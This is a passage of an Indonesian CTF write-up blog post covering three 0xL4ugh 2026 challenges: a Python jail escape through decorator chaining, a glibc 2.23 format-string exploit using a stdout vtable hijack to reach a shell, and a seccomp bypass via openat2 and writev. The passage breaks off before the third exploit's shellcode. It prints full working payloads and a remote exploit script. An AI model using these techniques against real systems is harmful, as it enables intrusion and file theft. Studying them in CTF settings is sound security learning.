@@ -1,0 +1,1434 @@
+---
+layout: post
+title: "0xL4ugh CTF 2026"
+date: 2026-01-25
+image: /assets/.
+categories: ["0xL4ugh"]
+tags: [pwn, misc, rev ctf2026]
+---
+
+## Ergastulum – Misc
+
+Target: `nc challenges2.ctf.sd 33076`
+
+### Intro
+
+Judul chall-nya udah ngasih ancaman dari awal:
+
+> “Do you enjoy Pyjails? Designed with zero mercy.”
+
+Dan bener… ini pyjail yang keliatannya “nggak ngasih napas”: karakter input dibatesin, AST disisir, `__builtins__` dikosongin, import dilarang. Tapi justru karena semuanya super ketat, satu celah kecil yang “nggak kelihatan kayak celah” jadi jalan keluar.
+
+Di write-up ini aku ceritain alurnya dari recon sampai payload final yang ngebaca flag di remote.
+
+---
+
+### Recon: lihat dulu penjaranya bentuk apa
+
+Di lokal aku cuma punya satu file: `main.py`. Ini yang langsung aku bedah dulu:
+
+```bash
+$ ls -la
+-rw-r--r-- 1 root root 2490 Jan 23 04:40 main.py
+```
+
+Isi yang paling “nggigit” (potongan):
+
+```py
+import ast,sys,string,_frozen_importlib
+
+ALLOWED=set(string.ascii_lowercase+string.digits+'()[]: ._@\n')
+BANNED=(ast.Import,ast.ImportFrom,ast.Call,ast.If,ast.Try,ast.While,ast.For,ast.Return,ast.Pass)
+
+...
+tree=compile(src,'','exec',flags=ast.PyCF_ONLY_AST)
+if verify(tree, src):
+    exec(compile(src,'','exec'),
+         {'__builtins__':{},
+          '__loader__':_frozen_importlib.BuiltinImporter})
+```
+
+Yang bisa kita catat dari sini:
+
+1. **Charset dibatasi**: cuma lowercase, angka, `()[]: ._@\n`. Jadi nggak ada tanda kutip, nggak ada `=`, nggak ada `+`, nggak ada `{}`.
+2. **AST disapu**: `Import`, `ImportFrom`, dan yang paling penting: **`ast.Call` dibanned**. Jadi pemanggilan fungsi biasa `print(...)` atau `open(...)` bakal mental.
+3. Code kita di-`exec()` dengan global:
+   - `__builtins__` kosong `{}` (jadi `print`, `open`, `__import__` hilang)
+   - tapi dikasih `__loader__ = _frozen_importlib.BuiltinImporter`
+
+Di titik ini biasanya orang langsung mikir “udah, game over”. Tapi `__loader__` itu bukan dekorasi: itu objek nyata, dan itu punya atribut/metode yang global scope-nya kebawa runtime importlib.
+
+---
+
+### Titik balik: `ast.Call` dibanned… tapi decorator *tetap nge-call*
+
+Kunci chall ini ada di satu fakta Python yang agak “licik”:
+
+- `ast.Call` itu node untuk pemanggilan fungsi yang **ditulis eksplisit** (`f(x)`).
+- Tapi **decorator** (`@deco`) menyebabkan Python melakukan call secara *implisit* saat definisi fungsi dieksekusi:
+
+Secara konsep:
+
+```py
+@deco
+def f(): ...
+```
+
+setara runtime-nya dengan:
+
+```py
+def f(): ...
+f = deco(f)
+```
+
+Yang menarik: di AST, itu **bukan** `ast.Call` yang kamu tulis, jadi lolos filter.
+
+Nah, kalau kita bisa dapet sesuatu yang bertindak sebagai “fungsi” (atau callable) dari environment, kita bisa “memanggil” lewat decorator chain tanpa pernah ngetik `(...)` call yang dilarang.
+
+---
+
+### Ngebangunin builtins tanpa builtins
+
+Global yang dikasih ke `exec()` cuma dua: `__builtins__` kosong dan `__loader__`. Jadi kita harus manjat lewat `__loader__`.
+
+`__loader__` adalah `_frozen_importlib.BuiltinImporter`. Beberapa metodenya (mis. `create_module`) adalah fungsi Python yang punya `__globals__`, dan di dalam global itu biasanya ada `sys`.
+
+Masalah berikutnya: kita nggak boleh nulis string `"sys"` atau `"builtins"` karena tanda kutip nggak masuk charset.
+
+Trik yang kepake:
+
+- Ambil string `"sys"` dari metadata code object: `__loader__.create_module.__code__.co_names[1]`
+  - di CPython, `co_names` berisi nama global yang dipakai fungsi; index `1` kebetulan `"sys"`.
+- Ambil string `"builtins"` tanpa kutip lewat: `[].__class__.__module__`
+  - module dari `list` itu `"builtins"`.
+
+Dari situ:
+
+Secara konsep (kalau jail-nya ngizinin quotes), jalurnya kira-kira begini:
+
+```py
+sys_mod = __loader__.create_module.__globals__["sys"]
+builtins = sys_mod.modules["builtins"]
+```
+
+Di payload asli, dua string literal itu aku “cetak” tanpa quotes:
+
+- `"sys"` → `__loader__.create_module.__code__.co_names[1]`
+- `"builtins"` → `[].__class__.__module__`
+
+Dan begitu dapet `builtins`, game berubah: kita balik punya `print`, `open`, dan `__import__`.
+
+---
+
+### Eksploitasi: import `os`, cari flag, lalu baca
+
+Aku sempet coba versi “langsung buka `flag`”, tapi remote nge-bales:
+
+```
+FileNotFoundError: [Errno 2] No such file or directory: 'flag'
+```
+
+Artinya nama/lokasinya beda. Dari traceback keliatan path runner: `/ctf/main.py`, jadi tebakan paling umum: flag ada di `/flag` atau `/ctf/flag.txt` (atau variasinya).
+
+Solusi: **import `os`**, `chdir` ke `/` lalu coba liat isi `/ctf` dan `/`, pilih yang punya file mengandung substring `flag`, lalu `open` dan `print` isinya.
+
+Semua itu dilakukan tanpa call eksplisit, murni lewat *decorator chaining*.
+
+Payload:
+
+```py
+def flag():
+ ...
+
+@(lambda f: __loader__.create_module.__globals__[__loader__.create_module.__code__.co_names[1]].modules[[].__class__.__module__])
+def b():
+ ...
+
+@b.__import__
+@(lambda f:f.__name__)
+def os():
+ ...
+
+@(lambda f: os.__file__[0])
+def root():
+ ...
+
+@os.chdir
+@(lambda f: root)
+def cdroot():
+ ...
+
+@(lambda f:f.__name__)
+def ctf():
+ ...
+
+@os.listdir
+@(lambda f: ctf)
+def filesctf():
+ ...
+
+@os.listdir
+@(lambda f: root)
+def filesroot():
+ ...
+
+@(lambda f:[x for x in filesctf if flag.__name__ in x])
+def c():
+ ...
+
+@(lambda f:[x for x in filesroot if flag.__name__ in x])
+def r():
+ ...
+
+@os.chdir
+@(lambda f: ctf if c else root)
+def cddir():
+ ...
+
+@(lambda f:(c or r)[0])
+def flagname():
+ ...
+
+@b.print
+@(lambda s:[x for x in s])
+@b.open
+@(lambda f: flagname)
+def out():
+ ...
+```
+
+Jalurnya simpel kalau dibaca sebagai cerita:
+
+1. `b()` diubah jadi objek `builtins` dengan cara manjat lewat `__loader__ → create_module.__globals__ → sys.modules[...]` (key `"sys"` dan `"builtins"` diambil tanpa quotes lewat `co_names` dan `[].__class__.__module__`).
+2. `os()` jadi modul `os` via `@b.__import__` (nama modul diambil dari `os.__name__`).
+3. `cdroot()` pindah ke `/`.
+4. Ambil listing `/ctf` dan `/`.
+5. Cari file yang mengandung substring `flag` (pakai `flag.__name__` biar “flag” muncul tanpa string literal).
+6. `chdir` ke folder yang punya flag.
+7. `open(flagname)` → iterasi file jadi list lines → `print(...)`.
+
+Semua “call” yang biasanya kita tulis (`open(...)`, `print(...)`, `__import__(...)`, `os.listdir(...)`) terjadi sebagai efek samping dari decorator, jadi filter `ast.Call` nggak punya pegangan.
+
+---
+
+### Eksekusi di remote
+
+Langsung kirim payload ke service (ingat: chall nunggu `end`):
+
+```bash
+nc challenges2.ctf.sd 33076
+# paste payload sebelumnya
+end
+```
+
+Outputnya ngasih flag:
+
+```
+['0xL4ugh{1_t0ld_y0u_N0_m3rcyyyyyy_f2570bfdae7d7faa}\n']
+```
+
+### Flag
+
+`0xL4ugh{1_t0ld_y0u_N0_m3rcyyyyyy_f2570bfdae7d7faa}`
+
+---
+
+## Zoro’s Blind Path — Pwn
+
+Target: `nc challenges3.ctf.sd 33068`
+
+### Intro
+
+Challenge ini namanya “**Zoro’s Blind Path**”. Vibenya pas: kita disuruh “menemukan jalan” di program yang kelihatannya *nggak ngasih apa-apa*… tapi ternyata justru bocor informasi dari hal yang “nggak kelihatan” — varargs `printf()` yang kebaca dari stack.
+
+Targetnya sederhana: dapet shell, baca flag.
+
+Di write-up ini aku ceritain perjalanan dari recon → ngerti bug → bikin primitive write → eksekusi `/bin/sh`.
+
+---
+
+### Recon: “ini binary apa dan proteksinya gimana?”
+
+```bash
+$ ls -la "Zoro#U2019s Blind Path"
+Dockerfile
+app
+flag
+```
+
+Cek tipe binary:
+
+```bash
+$ file "Zoro#U2019s Blind Path/app"
+ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
+```
+
+Non-PIE (type `EXEC`) dan *not stripped* → enak buat baca simbol:
+
+```bash
+$ readelf -h "Zoro#U2019s Blind Path/app" | rg 'Type:|Entry point'
+Type:                              EXEC (Executable file)
+Entry point address:               0x4005f0
+```
+
+Proteksi yang “kerasa” dari ELF metadata:
+
+```bash
+$ readelf -l "Zoro#U2019s Blind Path/app" | rg 'GNU_STACK|GNU_RELRO'
+GNU_STACK
+GNU_RELRO
+
+$ readelf -d "Zoro#U2019s Blind Path/app" | rg 'BIND_NOW'
+(BIND_NOW)
+```
+
+Interpretasi dikit:
+- **NX on** (`GNU_STACK` non-exec)
+- **Full RELRO** (`GNU_RELRO` + `BIND_NOW`) → GOT read-only (jadi “format string write ke GOT” bukan jalur nyaman)
+- **No PIE** → alamat binary statik, tapi libc tetap ASLR.
+
+Dan Dockerfile bilang ini Xenial:
+
+```bash
+$ cat "Zoro#U2019s Blind Path/Dockerfile" | head
+FROM ubuntu:16.04
+```
+
+Artinya: target libc sangat mungkin **glibc 2.23**.
+
+---
+
+### Bedah ASM: bug-nya kelihatan
+
+Karena ada simbol, langsung cari `main` dan fungsi menarik lain:
+
+```bash
+$ readelf -sW "Zoro#U2019s Blind Path/app" | rg ' main$| sanitize$'
+0000000000400793 sanitize
+00000000004007f5 main
+```
+
+Terus buat ngambil potongan ASM yang relevan tanpa scrolling kebanyakan, aku pakai `objdump` dengan range address:
+
+```bash
+$ objdump -d -M intel "Zoro#U2019s Blind Path/app" --start-address=0x400760 --stop-address=0x4008f0
+```
+
+#### Potongan ASM penting
+
+Disassembly `main` (bagian inti):
+
+- `main` @ `0x4007f5`
+- buffer pertama: `fgets(buf1, 0x108, stdin)`
+- buffer kedua: `fgets(buf2, 0x0a, stdin)`
+- keduanya di-*sanitize* lalu dipakai sebagai format string langsung lewat `printf(buf)`
+
+```asm
+0x40081e: mov rax, QWORD PTR [rip+0x2007fb]  # 0x601020 <stdout@GLIBC_2.2.5>
+0x400832: call printf@plt                     ; printf("[+] Clue: %p\n", stdout)
+...
+0x400857: call fgets@plt
+0x400875: call sanitize
+0x400889: call printf@plt                     ; printf(buf1)  <-- BUG 1
+0x400893: call puts@plt                       ; puts("Wrong path... try again:")
+...
+0x4008ae: call fgets@plt
+0x4008c9: call sanitize
+0x4008dd: call printf@plt                     ; printf(buf2)  <-- BUG 2
+0x4008e7: call puts@plt
+```
+
+String `.rodata` yang dipakai juga keliatan jelas:
+
+```text
+0x400a67: "[+] Clue: %p\n"
+0x400a75: "Write your path:"
+0x400a86: "\nWrong path... try again:"
+```
+
+Kita bisa cross-check langsung dari `.rodata`:
+
+```bash
+$ objdump -s -j .rodata "Zoro#U2019s Blind Path/app" --start-address=0x4009d0 --stop-address=0x400ab0
+```
+
+#### Pseudocode (hasil “convert” dari ASM)
+
+Aku convert pseudocode-nya biar kebaca:
+
+```c
+bool forbidden_char(int c) {
+  return (c=='X' || c=='P' || c=='S' || c=='$' || c=='s' || c=='x' || c=='p');
+}
+
+void sanitize(char *s) {
+  for (int i = 0; s[i] != '\0'; i++) {
+    if (forbidden_char((unsigned char)s[i])) {
+      puts("[-] Zoro lost his path... forbidden rune detected.");
+      exit(1);
+    }
+  }
+}
+
+int main() {
+  setup();
+  banner();
+  puts("Zoro is lost again...");
+  puts("This scroll hides its secrets, but gives you one clue:");
+
+  printf("[+] Clue: %p\n", stdout);      // leak pointer penting
+  puts("Write your path:");
+
+  if (!fgets(buf1, 0x108, stdin)) return 0;
+  sanitize(buf1);
+  printf(buf1);                          // format string vuln
+  puts("\nWrong path... try again:");
+
+  if (!fgets(buf2, 0x0a, stdin)) return 0;
+  sanitize(buf2);
+  printf(buf2);                          // format string vuln (lagi)
+  puts("\nZoro wanders off...");
+}
+```
+
+Dari sini, dua hal langsung “ngeklik”:
+
+1) **Ada format string** (`printf(buf)`), bahkan dua kali.
+2) Tapi ada filter: karakter `X P S $ s x p` dilarang → ini sengaja buat *matikan* `%p`, `%x`, `%s`, dan parameter posisi (`$`).
+
+Jadi exploitnya harus:
+- tetap bisa *write* tanpa `%p/%x/%s` dan tanpa `$`,
+- tapi cukup kuat buat lompat ke shell.
+
+---
+
+### “Clue” yang diam-diam brutal: leak libc lewat `stdout` (COPY reloc)
+
+Kalau lihat relocation table:
+
+```bash
+$ readelf -rW "Zoro#U2019s Blind Path/app" | rg 'stdout|stdin'
+0000000000601020 R_X86_64_COPY stdout@GLIBC_2.2.5
+0000000000601030 R_X86_64_COPY stdin@GLIBC_2.2.5
+```
+
+`stdout` di binary bukan sekadar pointer kecil — dia jadi **copy relocation** yang berisi address dari `_IO_2_1_stdout_` di libc.
+
+Maka output:
+
+```
+[+] Clue: 0x7f........
+```
+
+itu adalah **alamat libc**. Dengan libc 2.23 (Ubuntu 16.04), offset `_IO_2_1_stdout_`:
+
+```
+_IO_2_1_stdout_ = libc_base + 0x3c5620
+=> libc_base = leak - 0x3c5620
+```
+
+Ini bagian “yang tidak terlihat” tapi jadi jalan utama: leak-nya *udah disiapin*.
+
+---
+
+### Format string tanpa `$`: jalan “blind” yang benar-benar buta
+
+Karena `$` diblok, kita tidak bisa gaya klasik:
+
+```c
+%7$hn
+```
+
+Kita harus pakai format string “sequential”: setiap `%hn` akan mengambil argumen berikutnya dari `va_list` secara berurutan. Masalahnya: kita kan memanggil `printf(buf)` tanpa argumen tambahan — jadi “argumen berikutnya” itu awalnya sampah.
+
+Triknya:
+
+#### 1) Argumen kita “selipkan” di stack, tapi *di belakang NUL*
+
+`fgets()` bisa membaca byte `\x00` kalau kita kirim raw bytes (via script, bukan netcat manual). Dan `sanitize()` berhenti saat ketemu NUL:
+
+- byte setelah NUL **tidak disanitize**
+- `printf()` juga berhenti di NUL untuk format string-nya
+- tapi ketika `printf()` memproses `%hn`, dia tetap akan mengambil argumen dari stack/va_list
+
+Jadi kita bikin payload seperti ini:
+
+```
+[ format-string bytes ... ] 00 [ padding ] [ qword args ... ]
+```
+
+Format string-nya “bersih” (nggak ada `XPS$spx`), tapi argumen qword setelah NUL boleh berisi apa pun.
+
+#### 2) Write primitive pakai `%hn` + `%c`
+
+Karena `%n` menulis jumlah karakter yang sudah “tercetak”, kita bikin kontrol nilai dengan padding:
+
+```
+%<delta>c%hn
+```
+
+dan kita hanya pakai `%hn` (2-byte) biar fleksibel dan payload tetap muat limit `fgets`:
+
+```
+fgets(buf, 0x108) -> max read ~ 0x107 bytes (termasuk newline)
+```
+
+Di implementasi exploit yang aku bikin, ada optimisasi saat `delta == 0`:
+
+```
+%hn
+```
+
+(biar nggak buang-buang byte buat `%0c`).
+
+```py
+def build_fmt_payload(write_targets, last_write, max_total_len):
+    # ...
+    for addr, val16 in writes:
+        delta = (val16 - (count % 65536)) % 65536
+        if delta == 0:
+            fmt += b"%hn"
+            args += p64(addr)
+        else:
+            fmt += f"%{delta}c%hn".encode()
+            args += p64(0x41) + p64(addr)   # dummy + addr
+            count += delta
+    # payload = fmt + b"\x00" + pad + args + b"\n"
+```
+
+Kalau output exploit kelihatan “banjir spasi”, itu efek samping wajar dari `%<delta>c` yang mencetak banyak padding.
+
+---
+
+### Exploit plan: pakai stdout sebagai “kendaraan” (FSOP-ish)
+
+Karena **Full RELRO**, enaknya kita tidak ngejar GOT. Dan karena kita sudah punya libc base dari clue, jalur yang “bersih” adalah ngerusak internal `stdout` untuk mengarahkan eksekusi.
+
+Konsepnya:
+
+1) Overwrite `stdout` vtable pointer (di glibc 2.23, `stdout+0xd8`).
+2) Bikin supaya saat `puts()` dipanggil, ia memanggil function pointer yang kita kontrol.
+3) Jadikan call itu sebagai “trampoline” ke `setcontext+0x35` untuk pivot stack.
+4) Dari stack yang sudah rapi/zeroed, lompat ke `one_gadget` → `/bin/sh`.
+
+#### Offset dan address yang dipakai (glibc 2.23)
+
+Offset penting (glibc 2.23 / Ubuntu 16.04 Xenial):
+
+```text
+_IO_2_1_stdout_ : 0x3c5620
+__free_hook     : 0x3c67a8
+setcontext      : 0x047b50   (dipakai: setcontext+0x35)
+one_gadget      : 0x04527a
+"/bin/sh"       : 0x18ce57
+```
+
+Di runtime:
+
+```text
+libc_base   = leak_stdout - 0x3c5620
+stdout_addr = leak_stdout
+free_hook   = libc_base + 0x3c67a8
+```
+
+#### 1) Vtable hijack: arahkan `puts()` ke `__free_hook`
+
+Di glibc 2.23, vtable pointer `FILE*` ada di:
+
+```text
+stdout->_vtable = *(stdout + 0xd8)
+```
+
+Dan jalur write saat `puts()` akan memanggil fungsi vtable pada offset `+0x38`.
+
+Trik kecilnya: set vtable base = `__free_hook - 0x38`, sehingga:
+
+```text
+*(vtable + 0x38) == __free_hook
+```
+
+Jadi ketika `puts()` terjadi, ia akan melakukan call ke alamat yang tersimpan di `__free_hook`.
+
+Kita cukup overwrite **low 16-bit** dari pointer vtable (high bytes tetap menunjuk ke libc region yang sama):
+
+```text
+write16(stdout+0xd8, (free_hook - 0x38) & 0xffff)
+```
+
+#### 2) Set `__free_hook = setcontext+0x35` (stack pivot)
+
+Karena call-nya datang dari vtable (signature-nya mirip `xsputn(stdout, buf, len)`), register pertama (`rdi`) berisi `stdout`.
+
+`setcontext+0x35` di glibc 2.23 terkenal sebagai gadget pivot:
+
+- ia membaca context dari struktur yang ditunjuk `rdi`
+- dan mengatur `rsp`/`rip` dari offset tertentu
+
+Yang cocok banget karena layout `FILE` juga punya pointer “wide data” di `stdout+0xa0`.
+
+#### 3) Manfaatkan `stdout->_wide_data` sebagai “stack baru”
+
+`stdout->_wide_data` biasanya menunjuk ke area `.bss` libc yang **zeroed** (nyaman buat constraint one_gadget):
+
+```text
+stdout->_wide_data ≈ libc_base + 0x3c47a0
+```
+
+Jadi solver harus:
+- `stdout+0xa8 = one_gadget` (jadi “return address” setelah pivot)
+- `(wide_bss+0x30) = &"/bin/sh"` untuk memenuhi argv constraint one_gadget
+
+#### Rangkaian write yang kita lakukan
+
+Semua dilakukan via `%hn` (3 halfword untuk low 48-bit pointer):
+
+```text
+__free_hook      <- setcontext+0x35          (3x %hn)
+stdout + 0xa8    <- one_gadget              (3x %hn)
+wide_bss + 0x30  <- "/bin/sh" pointer       (3x %hn)
+stdout + 0xd8    <- vtable low16 (last)     (1x %hn)
+```
+
+Kenapa vtable ditulis “paling akhir”? Karena begitu vtable sudah berubah, `puts()` berikutnya bisa langsung ngetrigger eksekusi — jadi kita pastikan semua stage sudah siap dulu.
+
+---
+
+### Solver
+
+```python
+#!/usr/bin/env python3
+import argparse
+import re
+import socket
+import struct
+import subprocess
+import time
+from typing import List, Tuple
+
+
+def p64(x: int) -> bytes:
+    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)
+
+
+def recv_until(sock: socket.socket, marker: bytes, timeout_s: float = 5.0) -> bytes:
+    sock.settimeout(timeout_s)
+    data = b""
+    while marker not in data:
+        chunk = sock.recv(4096)
+        if not chunk:
+            break
+        data += chunk
+    return data
+
+
+def build_fmt_payload(
+    write_targets: List[Tuple[int, int]],
+    last_write: Tuple[int, int],
+    max_total_len: int,
+) -> bytes:
+    """
+    printf(fmt) format-string payload:
+    - No positional ($) parameters
+    - 2-byte writes via %hn
+    - Args are embedded after a NUL byte in the same fgets() buffer.
+    """
+    forbidden = set(b"XPS$spx")
+
+    body = sorted(write_targets, key=lambda t: t[1])
+    writes = body + [last_write]
+
+    pre = 0
+    while True:
+        count = pre
+        steps: List[Tuple[str, int, int]] = []
+        for addr, val16 in writes:
+            cur = count % 65536
+            delta = (val16 - cur) % 65536
+            if delta == 0:
+                steps.append(("nopad", 0, addr))
+            else:
+                steps.append(("pad", delta, addr))
+                count += delta
+
+        fmt = ("%c" * pre).encode()
+        for kind, delta, _addr in steps:
+            if kind == "pad":
+                fmt += f"%{delta}c%hn".encode()
+            else:
+                fmt += b"%hn"
+
+        if forbidden & set(fmt):
+            raise ValueError("forbidden bytes in format string")
+
+        pad = (8 - ((len(fmt) + 1) % 8)) % 8
+        offset_words = (len(fmt) + 1 + pad) // 8
+        first_arg_idx = 8 + offset_words
+        need_pre = first_arg_idx - 1
+
+        if need_pre == pre:
+            args = b""
+            dummy = 0x41
+            for kind, _delta, addr in steps:
+                if kind == "pad":
+                    args += p64(dummy) + p64(addr)
+                else:
+                    args += p64(addr)
+
+            payload = fmt + b"\x00" + (b"A" * pad) + args + b"\n"
+            if len(payload) > max_total_len:
+                raise ValueError(f"payload too long: {len(payload)} > {max_total_len}")
+            return payload
+
+        pre = need_pre
+
+
+def compute_payload(stdout_addr: int) -> bytes:
+    # Ubuntu 16.04 / glibc 2.23 offsets
+    IO_2_1_STDOUT_OFF = 0x3C5620
+    FREE_HOOK_OFF = 0x3C67A8
+    SETCONTEXT_OFF = 0x47B50
+    ONE_GADGET_OFF = 0x4527A
+    BINSH_OFF = 0x18CE57
+
+    libc_base = stdout_addr - IO_2_1_STDOUT_OFF
+    free_hook = libc_base + FREE_HOOK_OFF
+
+    vtable_ptr_addr = stdout_addr + 0xD8
+    fake_vtable_base = free_hook - 0x38
+
+    setcontext_rop = libc_base + SETCONTEXT_OFF + 0x35
+    stdout_a8 = stdout_addr + 0xA8
+    one_gadget = libc_base + ONE_GADGET_OFF
+
+    wide_bss = libc_base + 0x3C47A0
+    argv0_addr = wide_bss + 0x30
+    binsh = libc_base + BINSH_OFF
+
+    def hw3(x: int) -> List[int]:
+        return [(x >> (16 * i)) & 0xFFFF for i in range(3)]
+
+    write_targets: List[Tuple[int, int]] = []
+    for i, hv in enumerate(hw3(setcontext_rop)):
+        write_targets.append((free_hook + 2 * i, hv))
+    for i, hv in enumerate(hw3(one_gadget)):
+        write_targets.append((stdout_a8 + 2 * i, hv))
+    for i, hv in enumerate(hw3(binsh)):
+        write_targets.append((argv0_addr + 2 * i, hv))
+
+    last_write = (vtable_ptr_addr, fake_vtable_base & 0xFFFF)
+
+    return build_fmt_payload(write_targets, last_write, max_total_len=0x107)
+
+
+def local_run() -> None:
+    ld = "third_party/xenial_libc/lib/x86_64-linux-gnu/ld-2.23.so"
+    libpath = "third_party/xenial_libc/lib/x86_64-linux-gnu"
+    app = "/tmp/zoro_app"
+
+    proc = subprocess.Popen(
+        [ld, "--library-path", libpath, app],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+    )
+    assert proc.stdin and proc.stdout
+
+    out = b""
+    while b"Write your path:" not in out:
+        line = proc.stdout.readline()
+        if not line:
+            raise RuntimeError("failed to read banner")
+        out += line
+
+    m = re.search(rb"Clue: (0x[0-9a-fA-F]+)", out)
+    if not m:
+        raise RuntimeError("failed to parse clue")
+    stdout_addr = int(m.group(1), 16)
+
+    proc.stdin.write(compute_payload(stdout_addr))
+    proc.stdin.flush()
+
+    time.sleep(0.2)
+    proc.stdin.write(b"echo HI\nexit\n")
+    proc.stdin.flush()
+
+    stdout_data, _stderr_data = proc.communicate(timeout=3)
+    if b"HI" not in stdout_data:
+        raise RuntimeError("local check failed: no HI in output")
+    print("local ok")
+
+
+def remote_run(host: str, port: int) -> None:
+    with socket.create_connection((host, port), timeout=5.0) as sock:
+        banner = recv_until(sock, b"Write your path:", timeout_s=5.0)
+        m = re.search(rb"Clue: (0x[0-9a-fA-F]+)", banner)
+        if not m:
+            raise RuntimeError("failed to parse clue")
+        stdout_addr = int(m.group(1), 16)
+
+        sock.sendall(compute_payload(stdout_addr))
+
+        time.sleep(0.2)
+        sock.sendall(b"cat flag; cat /home/app/flag; echo DONE\n")
+
+        data = recv_until(sock, b"DONE\n", timeout_s=5.0)
+        print(data.decode(errors="replace"), end="")
+
+
+def main() -> None:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--local", action="store_true", help="run local check with bundled xenial libc")
+    ap.add_argument("--host", default="challenges3.ctf.sd")
+    ap.add_argument("--port", type=int, default=33068)
+    args = ap.parse_args()
+
+    if args.local:
+        local_run()
+    else:
+        remote_run(args.host, args.port)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+#### Local
+
+Kalau mau ngetes lokal dengan glibc Xenial (2.23), aku pakai loader+libc Xenial dan bikin symlink biar path binary-nya konsisten:
+
+```bash
+$ ln -sf "$(pwd)/Zoro#U2019s Blind Path/app" /tmp/zoro_app
+$ python3 exploit.py --local
+local ok
+```
+
+#### Remote
+
+```bash
+$ python3 exploit.py --host challenges3.ctf.sd --port 33068
+...
+0xL4ugh{Z0R0_F1N4LLY_F0UND_TH3_FM7_P47H_8afbd6ddc1209eaf}
+DONE
+```
+---
+
+## New Age — Pwn
+
+Target: `nc 159.89.106.147 1337`
+
+### Intro
+
+Ada dua hal yang bikin challenge ini langsung terasa “nakal tapi elegan”:
+
+1) Programnya *ngundang kita* untuk ngirim shellcode.
+2) Di saat yang sama, dia pamer “sandbox” seccomp seolah-olah itu pagar yang rapat.
+
+Kalimat marketing-nya kira-kira: *“seccomp filter yang carefully crafted akan selalu menyelamatkanmu.”*  
+Plot twist: pagar itu ada bolong kecil bernama **`openat2`**, dan ada satu aturan yang cuma ngiket **`write()`** tapi lupa **`writev()`**.
+
+Target kita sederhana: baca file flag di container, lalu print ke stdout, tanpa perlu `/bin/sh`.
+
+---
+
+### Recon: “binary ini ngapain sebelum seccomp?”
+
+Mulai dari yang basic:
+
+```bash
+file ./new_age
+```
+
+Hasilnya ELF 64-bit PIE, dynamically linked, **not stripped**. Enak: simbol `main` dan `setup` masih ada.
+
+Lanjut cari clue string:
+
+```bash
+strings -a ./new_age | rg -n 'New Age|shellcode|seccomp|key'
+```
+
+Kelihatan prompt:
+
+- `Welcome to the 'New Age' Sandbox`
+- `Send shellcode (max 4096 bytes):`
+
+Ini biasanya pola klasik: `mmap` RWX, `read` shellcode, pasang seccomp, lalu `call` ke buffer.
+
+Kita konfirmasi via disassembly:
+
+```bash
+objdump -d -M intel ./new_age | rg -n '<main>|<setup>'
+```
+
+Di binary ini, offset pentingnya:
+
+- `setup` di `0x11c9`
+- `main` di `0x1473`
+
+Dan `main` beneran melakukan “ritual sandbox” itu:
+
+```asm
+0x1506: call mmap
+0x1526: call read      ; baca 0x1000 byte shellcode ke code_region
+0x1530: call setup     ; pasang seccomp filter
+0x1544: call rdx       ; lompat ke shellcode (code_region)
+```
+
+#### Pseudocode dari `main` (hasil convert dari ASM)
+
+```c
+int main() {
+  setbuf(stdout, NULL);
+  alarm(60);
+  prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
+
+  puts("Welcome ...");
+  puts("Here is the key");
+  puts("Send shellcode (max 4096 bytes):");
+
+  code_region = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
+                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+  read(0, code_region, 0x1000);   // sebelum seccomp
+
+  setup();                        // install seccomp
+  ((void(*)())code_region)();     // eksekusi shellcode
+}
+```
+
+Sampai sini, tantangannya jelas: **shellcode execution di bawah seccomp**.
+
+---
+
+### Bedah seccomp: “carefully crafted” tapi salah sasaran
+
+Karena binary pakai libseccomp, kita bisa baca pola aturannya dari `setup`:
+
+- `seccomp_init(SCMP_ACT_ALLOW)` → defaultnya **ALLOW**
+- Lalu ditambah rule-rule yang *KILL* untuk syscall tertentu.
+
+Potongan yang bikin curiga justru ini:
+
+1) Ada aturan yang ngebunuh `read()` kalau buffer address berada **di bawah** batas tertentu (bertujuan mencegah kita “nulis ulang” shellcode page setelah filter aktif).
+2) Ada aturan yang ngebunuh `write()` kalau pointer buffer berada **di atas** `code_region + 0x400`.
+
+Kedengarannya rapih… sampai kita sadar dua hal:
+
+- Mereka cuma ngikat **`write`**, bukan **`writev`**.
+- Mereka blacklist `open` (2) dan `openat` (257), tapi lupa **`openat2` (437)**.
+
+Jadi “rencana penjara”-nya begini:
+
+- kamu boleh jalan-jalan (ALLOW by default),
+- tapi jangan buka file dengan `open/openat`,
+- dan jangan print dari buffer yang “bukan dari halaman shellcode”.
+
+Sedangkan “celah”-nya:
+
+- pakai `openat2` buat membuka file flag,
+- baca file itu dengan `read` ke stack,
+- print pakai `writev` (bukan `write`), sehingga aturan pointer `write` tidak kepakai sama sekali.
+
+#### Pseudocode dari `setup` (hasil convert dari ASM)
+
+```c
+void setup() {
+  ctx = seccomp_init(SCMP_ACT_ALLOW);
+  seccomp_arch_remove(ctx, SCMP_ARCH_X86);
+  seccomp_arch_remove(ctx, SCMP_ARCH_X32);
+
+  // kill read jika buf < code_region + 0xC00
+  seccomp_rule_add(ctx, SCMP_ACT_KILL, __NR_read, 1,
+                   SCMP_CMP(1, SCMP_CMP_LT, code_region + 0xC00));
+
+  // kill write jika buf > code_region + 0x400
+  seccomp_rule_add(ctx, SCMP_ACT_KILL, __NR_write, 1,
+                   SCMP_CMP(1, SCMP_CMP_GT, code_region + 0x400));
+
+  // kill beberapa syscall “berbahaya”
+  kill(__NR_open);
+  kill(__NR_openat);
+  kill(__NR_execve);
+  kill(__NR_execveat);
+  kill(__NR_fork);
+  kill(__NR_vfork);
+  kill(__NR_clone);
+  kill(__NR_clone3);
+  kill(__NR_socket);
+  kill(__NR_connect);
+  kill(__NR_sendfile);
+  kill(__NR_chroot);
+
+  seccomp_load(ctx);
+}
+```
+
+Kalau kamu pernah ngelihat bypass seccomp modern, ini salah satu pola paling sering:
+
+> blacklist syscall lama, lupa syscall “baru”.
+
+Dan `openat2` memang sering jadi “jendela belakang” karena relatif lebih baru.
+
+---
+
+### Exploit: satu file, satu loop, satu output
+
+Dockerfile-nya ngasih kita bocoran jalur flag:
+
+```dockerfile
+WORKDIR /app
+COPY new_age .
+COPY flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt .
+```
+
+Jadi shellcode kita tinggal:
+
